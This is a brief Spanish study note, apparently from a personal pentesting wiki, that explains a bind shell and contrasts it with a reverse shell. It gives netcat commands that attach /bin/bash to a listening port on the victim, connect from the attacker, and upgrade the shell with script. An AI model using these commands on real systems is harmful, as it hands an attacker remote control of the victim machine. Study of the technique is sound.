Esta técnica es el opuesto de la Reverse Shell, ya que en lugar de que la máquina comprometida se conecte a la máquina del atacante, es el atacante quien se conecta a la máquina comprometida. El atacante escucha en un puerto determinado y la máquina comprometida acepta la conexión entrante en ese puerto. El atacante luego tiene acceso por consola a la máquina comprometida, lo que le permite tomar el control de la misma.

se usa [[netcat]]

victima (listener)
nc -lvnp 4444 -e /bin/bash

atacante
nc IP_VICTIMA 4444

y luego script /dev/null -c bash
para que se vea mejor